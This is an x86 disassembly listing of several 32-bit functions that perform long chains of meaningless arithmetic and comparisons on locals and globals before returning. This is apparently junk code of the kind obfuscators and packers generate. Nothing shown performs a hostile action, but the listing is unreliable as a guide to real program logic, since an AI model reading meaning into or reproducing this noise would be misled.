  41b7bc:	add    DWORD PTR [ebp-0x4],edx
  41b7bf:	cmp    esi,0x3955
  41b7c5:	jne    0x41b7ca
  41b7c7:	xor    DWORD PTR [ebp-0x4],edx
  41b7ca:	mov    edi,DWORD PTR ds:0x459eb4
  41b7d0:	mov    edx,0x89
  41b7d5:	sub    edx,edi
  41b7d7:	sub    DWORD PTR [ebp-0x4],ecx
  41b7da:	and    edx,ebx
  41b7dc:	and    edx,esi
  41b7de:	and    edx,ecx
  41b7e0:	add    DWORD PTR [ebp-0x4],edx
  41b7e3:	add    DWORD PTR [ebp-0x4],ebx
  41b7e6:	mov    edi,DWORD PTR ds:0x459ec0
  41b7ec:	xor    DWORD PTR [ebp-0x4],edi
  41b7ef:	mov    eax,0x60
  41b7f4:	mov    eax,ebx
  41b7f6:	cmp    eax,0x9713
  41b7fb:	je     0x41b87a
  41b7fd:	mov    ecx,0x23
  41b802:	mov    edx,DWORD PTR [ebp-0x4]
  41b805:	cmp    edx,0x3389
  41b80b:	je     0x41b87a
  41b80d:	mov    esi,DWORD PTR [ebp-0x4]
  41b810:	or     DWORD PTR [ebp-0x4],ecx
  41b813:	sub    DWORD PTR [ebp-0x4],edx
  41b816:	mov    edx,esi
  41b818:	and    eax,edi
  41b81a:	cmp    edx,0x6
  41b81d:	jne    0x41b87a
  41b81f:	mov    ecx,DWORD PTR ds:0x459eb4
  41b825:	sub    eax,ecx
  41b827:	mov    ecx,DWORD PTR ds:0x459f20
  41b82d:	cmp    eax,ebx
  41b82f:	je     0x41b87a
  41b831:	and    DWORD PTR [ebp-0x4],ebx
  41b834:	sub    eax,ebx
  41b836:	sub    DWORD PTR [ebp-0x4],eax
  41b839:	cmp    edx,DWORD PTR ds:0x459f20
  41b83f:	je     0x41b87a
  41b841:	mov    edi,0x2d
  41b846:	cmp    edx,ebx
  41b848:	je     0x41b87a
  41b84a:	mov    esi,DWORD PTR ds:0x459ec0
  41b850:	mov    eax,DWORD PTR [ebp-0x4]
  41b853:	cmp    ebx,eax
  41b855:	jne    0x41b87a
  41b857:	sub    DWORD PTR [ebp-0x4],edi
  41b85a:	sub    esi,ecx
  41b85c:	mov    ecx,DWORD PTR [ebp-0x4]
  41b85f:	mov    edi,DWORD PTR [ebp-0x4]
  41b862:	add    DWORD PTR [ebp-0x4],edx
  41b865:	and    esi,ebx
  41b867:	add    DWORD PTR [ebp-0x4],esi
  41b86a:	cmp    eax,DWORD PTR ds:0x459f08
  41b870:	jne    0x41b87a
  41b872:	and    ecx,edi
  41b874:	sub    DWORD PTR [ebp-0x4],ecx
  41b877:	add    DWORD PTR [ebp-0x4],eax
  41b87a:	pop    edi
  41b87b:	mov    esi,DWORD PTR [ebp-0x4]
  41b87e:	add    DWORD PTR [ebp-0x4],edx
  41b881:	cmp    esi,0xffffff88
  41b884:	je     0x41b88f
  41b886:	add    esi,esi
  41b888:	cmp    edi,edx
  41b88a:	jne    0x41b88f
  41b88c:	add    DWORD PTR [ebp-0x4],esi
  41b88f:	pop    esi
  41b890:	sub    ecx,edi
  41b892:	cmp    esi,DWORD PTR ds:0x459eb4
  41b898:	je     0x41b8a9
  41b89a:	cmp    edx,DWORD PTR [ebp-0x14]
  41b89d:	jne    0x41b8a9
  41b89f:	add    ecx,esi
  41b8a1:	cmp    ecx,DWORD PTR [ebp-0x8]
  41b8a4:	jne    0x41b8a9
  41b8a6:	mov    DWORD PTR [ebp-0x4],ecx
  41b8a9:	pop    ebx
  41b8aa:	sub    DWORD PTR [ebp-0x4],ebx
  41b8ad:	leave  
  41b8ae:	ret    
  41b8af:	int3   
  41b8b0:	int3   
  41b8b1:	int3   
  41b8b2:	int3   
  41b8b3:	int3   
  41b8b4:	push   ebp
  41b8b5:	mov    ebp,esp
  41b8b7:	sub    esp,0x38
  41b8ba:	mov    edx,0x2b
  41b8bf:	mov    DWORD PTR [ebp-0x24],edx
  41b8c2:	push   ebx
  41b8c3:	mov    eax,0x85
  41b8c8:	mov    edx,0xb85f
  41b8cd:	add    DWORD PTR [ebp-0x24],edx
  41b8d0:	add    DWORD PTR [ebp-0x24],eax
  41b8d3:	push   esi
  41b8d4:	add    edx,edx
  41b8d6:	and    edx,eax
  41b8d8:	add    edx,edx
  41b8da:	sub    DWORD PTR [ebp-0x24],eax
  41b8dd:	sub    DWORD PTR [ebp-0x24],edx
  41b8e0:	push   edi
  41b8e1:	sub    DWORD PTR [ebp-0x24],edx
  41b8e4:	sub    edx,eax
  41b8e6:	mov    edi,DWORD PTR [ebp-0x24]
  41b8e9:	mov    DWORD PTR [ebp-0x24],edi
  41b8ec:	add    edx,edi
  41b8ee:	or     edx,edi
  41b8f0:	sub    DWORD PTR [ebp-0x24],edi
  41b8f3:	and    edx,edi
  41b8f5:	or     DWORD PTR [ebp-0x24],edx
  41b8f8:	mov    eax,DWORD PTR [ebp-0x24]
  41b8fb:	cmp    eax,edx
  41b8fd:	je     0x41b902
  41b8ff:	add    DWORD PTR [ebp-0x24],eax
  41b902:	mov    esi,DWORD PTR [ebp-0x24]
  41b905:	mov    edx,edi
  41b907:	sub    edx,edi
  41b909:	add    edx,eax
  41b90b:	mov    DWORD PTR [ebp-0x24],edx
  41b90e:	add    DWORD PTR [ebp-0x24],edx
  41b911:	sub    DWORD PTR [ebp-0x24],edi
  41b914:	cmp    esi,eax
  41b916:	je     0x41b92f
  41b918:	mov    eax,DWORD PTR ds:0x459ecc
  41b91e:	mov    edx,DWORD PTR ds:0x459ecc
  41b924:	add    DWORD PTR [ebp-0x24],esi
  41b927:	add    DWORD PTR [ebp-0x24],edx
  41b92a:	or     eax,edx
  41b92c:	add    DWORD PTR [ebp-0x24],eax
  41b92f:	pop    edi
  41b930:	mov    esi,0x78
  41b935:	mov    eax,edx
  41b937:	sub    eax,edx
  41b939:	sub    esi,eax
  41b93b:	add    esi,edx
  41b93d:	and    esi,eax
  41b93f:	sub    esi,edx
  41b941:	cmp    edi,0x26
  41b944:	jne    0x41b96a
  41b946:	mov    ecx,0xbd
  41b94b:	mov    esi,DWORD PTR ds:0x459ecc
  41b951:	cmp    edi,DWORD PTR [ebp-0x8]
  41b954:	jne    0x41b96a
  41b956:	mov    ecx,DWORD PTR [ebp-0x24]
  41b959:	mov    eax,DWORD PTR [ebp-0x24]
  41b95c:	sub    esi,edi
  41b95e:	sub    DWORD PTR [ebp-0x24],ecx
  41b961:	add    DWORD PTR [ebp-0x24],esi
  41b964:	sub    DWORD PTR [ebp-0x24],esi
  41b967:	and    DWORD PTR [ebp-0x24],eax
  41b96a:	pop    esi
  41b96b:	cmp    esi,0x67
  41b96e:	je     0x41b973
  41b970:	add    DWORD PTR [ebp-0x24],eax
  41b973:	pop    ebx
  41b974:	or     edx,ecx
  41b976:	add    edx,eax
  41b978:	mov    eax,DWORD PTR ds:0x459ecc
  41b97e:	and    edx,esi
  41b980:	sub    edx,ebx
  41b982:	mov    ecx,DWORD PTR [ebp-0x24]
  41b985:	add    edx,ecx
  41b987:	cmp    edi,DWORD PTR [ebp-0x8]
  41b98a:	jne    0x41b9b7
  41b98c:	sub    edx,ecx
  41b98e:	sub    DWORD PTR [ebp-0x24],edx
  41b991:	mov    edx,esi
  41b993:	mov    ecx,DWORD PTR [ebp-0x24]
  41b996:	or     ecx,edx
  41b998:	sub    ecx,ebx
  41b99a:	sub    ecx,eax
  41b99c:	test   ecx,0x9545
  41b9a2:	je     0x41b9b7
  41b9a4:	mov    edx,0xf7c7
  41b9a9:	add    DWORD PTR [ebp-0x24],ecx
  41b9ac:	mov    ecx,DWORD PTR [ebp-0x24]
  41b9af:	add    DWORD PTR [ebp-0x24],ecx
  41b9b2:	or     ecx,edx
  41b9b4:	mov    DWORD PTR [ebp-0x2c],ecx
  41b9b7:	leave  
  41b9b8:	ret    
  41b9b9:	int3   
  41b9ba:	int3   
  41b9bb:	int3   
  41b9bc:	int3   
  41b9bd:	int3   
  41b9be:	push   ebp
  41b9bf:	mov    ebp,esp
  41b9c1:	sub    esp,0x2c
  41b9c4:	mov    eax,0xab
  41b9c9:	mov    DWORD PTR [ebp-0x4],eax
  41b9cc:	push   ebx
  41b9cd:	mov    eax,DWORD PTR [ebp-0x4]
  41b9d0:	add    eax,eax
  41b9d2:	test   eax,0x4e
  41b9d7:	je     0x41b9dc
  41b9d9:	add    DWORD PTR [ebp-0x4],eax
  41b9dc:	push   esi
  41b9dd:	cmp    eax,DWORD PTR [ebp-0x18]
  41b9e0:	je     0x41b9ea
  41b9e2:	mov    ecx,0xa9
  41b9e7:	add    DWORD PTR [ebp-0x4],ecx
  41b9ea:	push   edi
  41b9eb:	sub    DWORD PTR [ebp-0x4],ecx
  41b9ee:	cmp    eax,0x9
  41b9f1:	jne    0x41b9fb
  41b9f3:	mov    edx,0x99
  41b9f8:	mov    DWORD PTR [ebp-0x28],edx
  41b9fb:	mov    ebx,DWORD PTR [ebp-0x4]
  41b9fe:	add    ebx,eax
  41ba00:	mov    esi,DWORD PTR [ebp-0x4]
  41ba03:	add    DWORD PTR [ebp-0x4],esi
  41ba06:	and    ebx,edx
  41ba08:	test   ebx,0xd3a3
  41ba0e:	je     0x41ba4a
  41ba10:	add    ebx,ecx
  41ba12:	cmp    ebx,0xa67f
  41ba18:	je     0x41ba4a
  41ba1a:	sub    ebx,esi
  41ba1c:	add    ebx,esi
  41ba1e:	sub    ebx,eax
  41ba20:	mov    edx,DWORD PTR [ebp-0x4]
  41ba23:	mov    ecx,eax
  41ba25:	add    ebx,edx
  41ba27:	test   ecx,0x9533
  41ba2d:	je     0x41ba4a
  41ba2f:	and    ebx,esi
  41ba31:	add    DWORD PTR [ebp-0x4],ebx
  41ba34:	mov    edi,eax
  41ba36:	or     DWORD PTR [ebp-0x4],ecx
  41ba39:	cmp    edi,eax
  41ba3b:	jne    0x41ba4a
  41ba3d:	cmp    edi,0xfffffff8
  41ba40:	je     0x41ba4a
  41ba42:	cmp    ebx,DWORD PTR [ebp-0xc]
  41ba45:	jne    0x41ba4a
  41ba47:	mov    DWORD PTR [ebp-0x4],edi
  41ba4a:	cmp    ecx,0xa1088080
  41ba50:	je     0x41ba55
  41ba52:	add    DWORD PTR [ebp-0x4],edi
  41ba55:	sub    eax,esi
  41ba57:	sub    DWORD PTR [ebp-0x4],eax
  41ba5a:	pop    edi
  41ba5b:	cmp    edi,ebx
  41ba5d:	jne    0x41ba74
  41ba5f:	mov    ecx,DWORD PTR ds:0x459f0c
  41ba65:	add    DWORD PTR [ebp-0x4],edi
  41ba68:	mov    ebx,eax
  41ba6a:	sub    ebx,eax
  41ba6c:	add    ecx,ebx
  41ba6e:	sub    DWORD PTR [ebp-0x4],esi
  41ba71:	add    DWORD PTR [ebp-0x4],ecx
  41ba74:	pop    esi
  41ba75:	mov    eax,DWORD PTR [ebp-0x4]
  41ba78:	xor    DWORD PTR [ebp-0x4],eax
  41ba7b:	pop    ebx
  41ba7c:	add    DWORD PTR [ebp-0x4],ebx
  41ba7f:	leave  
  41ba80:	ret    
  41ba81:	int3   
  41ba82:	int3   
  41ba83:	int3   
  41ba84:	int3   
  41ba85:	int3   
  41ba86:	push   ebp
  41ba87:	mov    ebp,esp
  41ba89:	sub    esp,0x28
  41ba8c:	mov    eax,DWORD PTR ds:0x459ee8
  41ba92:	mov    DWORD PTR [ebp-0x24],eax
  41ba95:	push   ebx
  41ba96:	mov    eax,0xb26d
  41ba9b:	mov    DWORD PTR [ebp-0x24],eax
  41ba9e:	push   esi
  41ba9f:	xor    DWORD PTR [ebp-0x24],eax
  41baa2:	push   edi
  41baa3:	and    DWORD PTR [ebp-0x24],eax
  41baa6:	mov    edx,DWORD PTR [ebp-0x24]
  41baa9:	add    edx,eax
  41baab:	cmp    edx,DWORD PTR ds:0x459ee8
  41bab1:	jne    0x41bab6
  41bab3:	sub    DWORD PTR [ebp-0x24],edx
  41bab6:	mov    esi,DWORD PTR [ebp-0x24]
  41bab9:	mov    DWORD PTR [ebp-0x24],esi
  41babc:	mov    eax,DWORD PTR ds:0x459e6c
  41bac2:	sub    eax,esi
  41bac4:	cmp    eax,DWORD PTR [ebp-0x24]
  41bac7:	je     0x41bacc
  41bac9:	sub    DWORD PTR [ebp-0x24],eax
  41bacc:	add    eax,eax
  41bace:	add    eax,eax
  41bad0:	sub    eax,esi
  41bad2:	and    eax,esi
  41bad4:	sub    eax,edx
  41bad6:	add    DWORD PTR [ebp-0x24],eax
  41bad9:	pop    edi
  41bada:	mov    ebx,0x519a
  41badf:	mov    eax,DWORD PTR [ebp-0x24]
  41bae2:	add    eax,esi
  41bae4:	cmp    eax,edx
  41bae6:	jne    0x41bc87
  41baec:	add    ebx,edx
  41baee:	cmp    edi,esi
  41baf0:	je     0x41bc87
  41baf6:	test   eax,0xbc
  41bafb:	jne    0x41bc87
  41bb01:	and    ebx,edi
  41bb03:	or     eax,esi
  41bb05:	cmp    eax,0x2e
  41bb08:	jne    0x41bc87
  41bb0e:	cmp    eax,DWORD PTR ds:0x459ee8
  41bb14:	je     0x41bc87
  41bb1a:	sub    DWORD PTR [ebp-0x24],eax
  41bb1d:	mov    eax,DWORD PTR [ebp-0x24]
  41bb20:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb23:	add    DWORD PTR [ebp-0x24],eax
  41bb26:	cmp    ecx,0xfffffff6
  41bb29:	je     0x41bc87
  41bb2f:	mov    edx,0x69
  41bb34:	and    ebx,esi
  41bb36:	mov    eax,0x91
  41bb3b:	or     DWORD PTR [ebp-0x24],ecx
  41bb3e:	add    DWORD PTR [ebp-0x24],eax
  41bb41:	add    DWORD PTR [ebp-0x24],edx
  41bb44:	add    ebx,edx
  41bb46:	cmp    ebx,0x7a73
  41bb4c:	je     0x41bc87
  41bb52:	cmp    ebx,0x4f
  41bb55:	jne    0x41bc87
  41bb5b:	sub    ebx,edx
  41bb5d:	cmp    ebx,DWORD PTR [ebp-0x18]
  41bb60:	je     0x41bc87
  41bb66:	mov    edx,DWORD PTR [ebp-0x24]
  41bb69:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb6c:	or     DWORD PTR [ebp-0x24],ecx
  41bb6f:	cmp    edx,DWORD PTR ds:0x459ee8
  41bb75:	je     0x41bc87
  41bb7b:	add    edx,eax
  41bb7d:	mov    esi,DWORD PTR ds:0x459edc
  41bb83:	sub    edx,edi
  41bb85:	sub    edx,esi
  41bb87:	cmp    edx,DWORD PTR [ebp-0x18]
  41bb8a:	jne    0x41bc87
  41bb90:	cmp    edx,0x1d11022
  41bb96:	je     0x41bc87
  41bb9c:	mov    eax,0x39
  41bba1:	mov    ecx,DWORD PTR [ebp-0x24]
  41bba4:	add    DWORD PTR [ebp-0x24],ecx
  41bba7:	cmp    ebx,DWORD PTR [ebp-0x24]
  41bbaa:	jne    0x41bc87
  41bbb0:	add    DWORD PTR [ebp-0x24],ebx
  41bbb3:	mov    esi,0xfb72
  41bbb8:	mov    ecx,DWORD PTR ds:0x459edc
  41bbbe:	cmp    edx,DWORD PTR ds:0x459e6c
  41bbc4:	je     0x41bc87
  41bbca:	sub    DWORD PTR [ebp-0x24],esi
  41bbcd:	mov    ebx,DWORD PTR [ebp-0x24]
  41bbd0:	cmp    ebx,ecx
  41bbd2:	je     0x41bc87
  41bbd8:	mov    esi,DWORD PTR [ebp-0x24]
  41bbdb:	sub    DWORD PTR [ebp-0x24],esi
  41bbde:	mov    DWORD PTR [ebp-0x28],eax
  41bbe1:	add    DWORD PTR [ebp-0x28],edx
  41bbe4:	mov    edx,DWORD PTR ds:0x459f00
  41bbea:	sub    DWORD PTR [ebp-0x28],ebx
  41bbed:	add    ecx,esi
  41bbef:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41bbf2:	je     0x41bc87
  41bbf8:	and    DWORD PTR [ebp-0x28],ecx
  41bbfb:	sub    esi,edx
  41bbfd:	mov    eax,0xba
  41bc02:	mov    ecx,DWORD PTR [ebp-0x24]
  41bc05:	sub    esi,eax
  41bc07:	cmp    ecx,0xffffffea
  41bc0a:	je     0x41bc87
  41bc0c:	mov    eax,0x17df
  41bc11:	mov    edx,DWORD PTR [ebp-0x28]
  41bc14:	add    ecx,ebx
  41bc16:	or     esi,ecx
  41bc18:	add    DWORD PTR [ebp-0x28],eax
  41bc1b:	and    esi,ecx
  41bc1d:	cmp    edi,DWORD PTR ds:0x459e6c
  41bc23:	je     0x41bc87
  41bc25:	cmp    edx,0xffffff99
  41bc28:	je     0x41bc87
  41bc2a:	mov    eax,DWORD PTR [ebp-0x24]
  41bc2d:	add    edx,ebx
  41bc2f:	or     esi,edx
  41bc31:	mov    ecx,DWORD PTR [ebp-0x24]
  41bc34:	add    DWORD PTR [ebp-0x24],esi
  41bc37:	cmp    ecx,0x9f70
  41bc3d:	je     0x41bc87
  41bc3f:	mov    esi,DWORD PTR [ebp-0x24]
  41bc42:	sub    eax,edx
  41bc44:	cmp    eax,DWORD PTR ds:0x459edc
  41bc4a:	jne    0x41bc87
  41bc4c:	test   ecx,0x3377
  41bc52:	jne    0x41bc87
  41bc54:	mov    ebx,DWORD PTR [ebp-0x28]
  41bc57:	or     eax,edx
  41bc59:	mov    edx,ebx
  41bc5b:	cmp    eax,0xffffffc4
  41bc5e:	jne    0x41bc87
  41bc60:	cmp    ecx,0x30
  41bc63:	jne    0x41bc87
  41bc65:	add    DWORD PTR [ebp-0x28],edx
  41bc68:	and    DWORD PTR [ebp-0x28],eax
  41bc6b:	sub    esi,edx
  41bc6d:	mov    ebx,0x35
  41bc72:	or     ecx,ebx
  41bc74:	mov    edx,edi
  41bc76:	or     esi,ebx
  41bc78:	add    edx,eax
  41bc7a:	sub    DWORD PTR [ebp-0x24],esi
  41bc7d:	sub    edx,eax
  41bc7f:	sub    ecx,edx
  41bc81:	add    DWORD PTR [ebp-0x24],esi
  41bc84:	add    DWORD PTR [ebp-0x28],ecx
  41bc87:	pop    esi
  41bc88:	mov    edx,DWORD PTR [ebp-0x24]
  41bc8b:	cmp    edx,DWORD PTR ds:0x459e6c
  41bc91:	je     0x41bce1
  41bc93:	add    DWORD PTR [ebp-0x24],esi
  41bc96:	mov    ebx,0x60
  41bc9b:	sub    edx,eax
  41bc9d:	test   edx,0xb000240
  41bca3:	jne    0x41bce1
  41bca5:	mov    ebx,0x5a
  41bcaa:	cmp    edx,0x1002004
  41bcb0:	je     0x41bce1
  41bcb2:	sub    DWORD PTR [ebp-0x24],ebx
  41bcb5:	mov    eax,DWORD PTR [ebp-0x24]
  41bcb8:	sub    DWORD PTR [ebp-0x24],edx
  41bcbb:	mov    ebx,DWORD PTR [ebp-0x24]
  41bcbe:	add    ebx,edx
  41bcc0:	add    DWORD PTR [ebp-0x24],ebx
  41bcc3:	test   ebx,0x7d
  41bcc9:	jne    0x41bce1
  41bccb:	cmp    eax,0x3a
  41bcce:	jne    0x41bce1
  41bcd0:	mov    ebx,DWORD PTR [ebp-0x24]
  41bcd3:	mov    ecx,DWORD PTR [ebp-0x24]
  41bcd6:	add    DWORD PTR [ebp-0x24],ebx
  41bcd9:	mov    DWORD PTR [ebp-0x24],eax
  41bcdc:	sub    ecx,edi
  41bcde:	add    DWORD PTR [ebp-0x24],ecx
  41bce1:	pop    ebx
  41bce2:	cmp    edx,DWORD PTR ds:0x459f00
  41bce8:	jne    0x41bcf2
  41bcea:	cmp    ebx,0xffffffaf
  41bced:	jne    0x41bcf2
  41bcef:	sub    DWORD PTR [ebp-0x24],ebx
  41bcf2:	leave  
  41bcf3:	ret    
  41bcf4:	int3   
  41bcf5:	int3   
  41bcf6:	int3   
  41bcf7:	int3   
  41bcf8:	int3   
  41bcf9:	push   ebp
  41bcfa:	mov    ebp,esp
  41bcfc:	sub    esp,0x20
  41bcff:	mov    edx,DWORD PTR ds:0x459ed4
  41bd05:	mov    ecx,DWORD PTR ds:0x459ed4
  41bd0b:	add    ecx,edx
  41bd0d:	and    ecx,edx
  41bd0f:	mov    DWORD PTR [ebp-0x20],ecx
  41bd12:	push   ebx
  41bd13:	mov    ebx,DWORD PTR [ebp-0x20]
  41bd16:	add    ebx,edx
  41bd18:	add    DWORD PTR [ebp-0x20],ebx
  41bd1b:	push   esi
  41bd1c:	add    edx,ecx
  41bd1e:	mov    DWORD PTR [ebp-0x1c],edx
  41bd21:	push   edi
  41bd22:	mov    ebx,DWORD PTR [ebp-0x1c]
  41bd25:	mov    ecx,DWORD PTR [ebp-0x20]
  41bd28:	sub    DWORD PTR [ebp-0x20],ebx
  41bd2b:	and    ecx,ebx
  41bd2d:	add    DWORD PTR [ebp-0x20],ecx
  41bd30:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd33:	add    DWORD PTR [ebp-0x20],ecx
  41bd36:	mov    ebx,0x9990
  41bd3b:	cmp    ecx,ebx
  41bd3d:	jne    0x41bd74
  41bd3f:	or     ebx,edx
  41bd41:	mov    eax,DWORD PTR [ebp-0x20]
  41bd44:	sub    DWORD PTR [ebp-0x20],eax
  41bd47:	sub    ebx,eax
  41bd49:	mov    ecx,DWORD PTR [ebp-0x20]
  41bd4c:	cmp    ecx,ebx
  41bd4e:	je     0x41bd74
  41bd50:	and    ecx,eax
  41bd52:	cmp    ecx,DWORD PTR [ebp-0x14]
  41bd55:	jne    0x41bd74
  41bd57:	add    ecx,edx
  41bd59:	mov    edi,0x553e
  41bd5e:	mov    esi,0xaf
  41bd63:	add    DWORD PTR [ebp-0x1c],ecx
  41bd66:	add    esi,ebx
  41bd68:	and    edi,ecx
  41bd6a:	sub    DWORD PTR [ebp-0x1c],edi
  41bd6d:	add    esi,ecx
  41bd6f:	add    esi,ebx
  41bd71:	add    DWORD PTR [ebp-0x1c],esi
  41bd74:	cmp    ecx,0x40
  41bd77:	jne    0x41bdb1
  41bd79:	mov    ebx,DWORD PTR [ebp-0x1c]
  41bd7c:	or     ebx,ecx
  41bd7e:	mov    ecx,DWORD PTR ds:0x459e88
  41bd84:	sub    DWORD PTR [ebp-0x1c],eax
  41bd87:	mov    DWORD PTR [ebp-0x1c],edx
  41bd8a:	and    DWORD PTR [ebp-0x20],ecx
  41bd8d:	cmp    ebx,0x1d
  41bd90:	je     0x41bdb1
  41bd92:	cmp    ebx,DWORD PTR ds:0x459ed4
  41bd98:	jne    0x41bdb1
  41bd9a:	mov    eax,0x9911
  41bd9f:	mov    ecx,0x1
  41bda4:	add    DWORD PTR [ebp-0x1c],ecx
  41bda7:	add    eax,esi
  41bda9:	add    DWORD PTR [ebp-0x1c],eax
  41bdac:	or     ebx,ecx
  41bdae:	xor    DWORD PTR [ebp-0x1c],ebx
  41bdb1:	mov    edi,0xd7
  41bdb6:	sub    edx,ebx
  41bdb8:	add    DWORD PTR [ebp-0x1c],ebx
  41bdbb:	mov    ecx,0xab
  41bdc0:	sub    DWORD PTR [ebp-0x20],edx
  41bdc3:	add    edi,edi
  41bdc5:	add    DWORD PTR [ebp-0x1c],ebx
  41bdc8:	and    ecx,eax
  41bdca:	and    DWORD PTR [ebp-0x1c],edi
  41bdcd:	sub    DWORD PTR [ebp-0x20],ecx
  41bdd0:	mov    eax,esi
  41bdd2:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bdd5:	and    eax,ecx
  41bdd7:	and    eax,esi
  41bdd9:	cmp    ebx,0xffffffac
  41bddc:	jne    0x41be95
  41bde2:	mov    ebx,DWORD PTR ds:0x459e88
  41bde8:	cmp    eax,ebx
  41bdea:	je     0x41be95
  41bdf0:	test   eax,0x3
  41bdf5:	je     0x41be95
  41bdfb:	sub    eax,ecx
  41bdfd:	mov    esi,DWORD PTR [ebp-0x1c]
  41be00:	mov    edx,0xe5
  41be05:	add    edx,eax
  41be07:	add    edx,eax
  41be09:	add    esi,ebx
  41be0b:	and    esi,eax
  41be0d:	cmp    edx,esi
  41be0f:	je     0x41be95
  41be15:	xor    DWORD PTR [ebp-0x1c],edx
  41be18:	cmp    esi,0x11
  41be1b:	je     0x41be95
  41be1d:	cmp    esi,DWORD PTR [ebp-0x18]
  41be20:	jne    0x41be95
  41be22:	or     DWORD PTR [ebp-0x1c],ecx
  41be25:	mov    eax,DWORD PTR [ebp-0x20]
  41be28:	xor    DWORD PTR [ebp-0x20],esi
  41be2b:	mov    edi,DWORD PTR [ebp-0x20]
  41be2e:	cmp    eax,ecx
  41be30:	je     0x41be95
  41be32:	and    edi,ecx
  41be34:	cmp    edi,0xffffffc7
  41be37:	je     0x41be95
  41be39:	cmp    edi,0xffffffb6
  41be3c:	je     0x41be95
  41be3e:	mov    edx,0x20
  41be43:	cmp    edi,ecx
  41be45:	je     0x41be95
  41be47:	mov    ebx,0x5f
  41be4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41be4f:	add    edx,edx
  41be51:	cmp    edi,0xfffffff8
  41be54:	jne    0x41be95
  41be56:	mov    esi,0x55
  41be5b:	sub    DWORD PTR [ebp-0x20],esi
  41be5e:	mov    esi,DWORD PTR [ebp-0x1c]
  41be61:	cmp    edi,DWORD PTR ds:0x459e88
  41be67:	je     0x41be95
  41be69:	mov    edx,DWORD PTR ds:0x459e88
  41be6f:	add    edi,esi
  41be71:	sub    ecx,eax
  41be73:	sub    DWORD PTR [ebp-0x20],ecx
  41be76:	mov    eax,DWORD PTR [ebp-0x1c]
  41be79:	add    DWORD PTR [ebp-0x1c],edi
  41be7c:	sub    DWORD PTR [ebp-0x20],edx
  41be7f:	or     eax,edx
  41be81:	sub    DWORD PTR [ebp-0x1c],ebx
  41be84:	cmp    eax,DWORD PTR [ebp-0x20]
  41be87:	je     0x41be95
  41be89:	mov    ebx,DWORD PTR ds:0x459e88
  41be8f:	mov    DWORD PTR [ebp-0x1c],ebx
  41be92:	or     DWORD PTR [ebp-0x1c],eax
  41be95:	pop    edi
  41be96:	mov    edx,DWORD PTR [ebp-0x20]
  41be99:	mov    esi,ebx
  41be9b:	cmp    edx,DWORD PTR [ebp-0x4]
  41be9e:	je     0x41bead
  41bea0:	and    edx,esi
  41bea2:	sub    DWORD PTR [ebp-0x20],edi
  41bea5:	add    DWORD PTR [ebp-0x1c],ecx
  41bea8:	mov    ebx,edx
  41beaa:	mov    DWORD PTR [ebp-0xc],ebx
  41bead:	pop    esi
  41beae:	add    ecx,eax
  41beb0:	xor    DWORD PTR [ebp-0x1c],eax
  41beb3:	mov    eax,DWORD PTR [ebp-0x1c]
  41beb6:	mov    edx,DWORD PTR [ebp-0x20]
  41beb9:	add    ecx,ebx
  41bebb:	and    eax,ebx
  41bebd:	add    eax,esi
  41bebf:	add    ecx,esi
  41bec1:	add    DWORD PTR [ebp-0x20],eax
  41bec4:	sub    ecx,edi
  41bec6:	mov    DWORD PTR [ebp-0x1c],edx
  41bec9:	add    ecx,eax
  41becb:	sub    ecx,edi
  41becd:	sub    ecx,edi
  41becf:	sub    ecx,edx
  41bed1:	and    ecx,edx
  41bed3:	and    ecx,esi
  41bed5:	sub    DWORD PTR [ebp-0x1c],ecx
  41bed8:	pop    ebx
  41bed9:	add    ecx,ecx
  41bedb:	cmp    esi,edx
  41bedd:	jne    0x41bf95
  41bee3:	mov    eax,DWORD PTR [ebp-0x1c]
  41bee6:	add    DWORD PTR [ebp-0x1c],ebx
  41bee9:	sub    ecx,esi
  41beeb:	and    DWORD PTR [ebp-0x20],eax
  41beee:	mov    eax,0x2b07
  41bef3:	sub    ecx,edi
  41bef5:	cmp    ebx,DWORD PTR ds:0x459e88
  41befb:	jne    0x41bf95
  41bf01:	and    DWORD PTR [ebp-0x20],ecx
  41bf04:	sub    eax,ecx
  41bf06:	test   eax,0xb3
  41bf0b:	je     0x41bf95
  41bf11:	mov    ecx,eax
  41bf13:	cmp    ecx,DWORD PTR [ebp-0x18]
  41bf16:	je     0x41bf95
  41bf18:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf1b:	mov    eax,0x56
  41bf20:	add    DWORD PTR [ebp-0x20],eax
  41bf23:	add    DWORD PTR [ebp-0x1c],edi
  41bf26:	test   edx,0x1b
  41bf2c:	je     0x41bf95
  41bf2e:	sub    DWORD PTR [ebp-0x1c],edx
  41bf31:	add    ecx,ecx
  41bf33:	mov    eax,DWORD PTR [ebp-0x1c]
  41bf36:	mov    edx,0x6b
  41bf3b:	mov    DWORD PTR [ebp-0x20],edx
  41bf3e:	add    ecx,ebx
  41bf40:	cmp    eax,ebx
  41bf42:	jne    0x41bf95
  41bf44:	add    DWORD PTR [ebp-0x1c],ecx
  41bf47:	cmp    eax,0x5a1f
  41bf4c:	je     0x41bf95
  41bf4e:	sub    eax,ecx
  41bf50:	mov    edx,DWORD PTR [ebp-0x20]
  41bf53:	cmp    edx,DWORD PTR [ebp-0x20]
  41bf56:	je     0x41bf95
  41bf58:	mov    ecx,DWORD PTR ds:0x459ed4
  41bf5e:	and    eax,esi
  41bf60:	sub    DWORD PTR [ebp-0x20],edx
  41bf63:	add    DWORD PTR [ebp-0x20],ecx
  41bf66:	cmp    eax,DWORD PTR ds:0x459e88
  41bf6c:	jne    0x41bf95
  41bf6e:	and    eax,ecx
  41bf70:	test   eax,0xaf
  41bf75:	jne    0x41bf95
  41bf77:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bf7a:	cmp    eax,DWORD PTR ds:0x459ed4
  41bf80:	jne    0x41bf95
  41bf82:	add    DWORD PTR [ebp-0x1c],eax
  41bf85:	mov    edx,DWORD PTR [ebp-0x1c]
  41bf88:	add    DWORD PTR [ebp-0x1c],edx
  41bf8b:	sub    ecx,edx
  41bf8d:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41bf90:	jne    0x41bf95
  41bf92:	add    DWORD PTR [ebp-0x20],ecx
  41bf95:	leave  
  41bf96:	ret    
  41bf97:	int3   
  41bf98:	int3   
  41bf99:	int3   
  41bf9a:	int3   
  41bf9b:	int3   
  41bf9c:	push   ebp
  41bf9d:	mov    ebp,esp
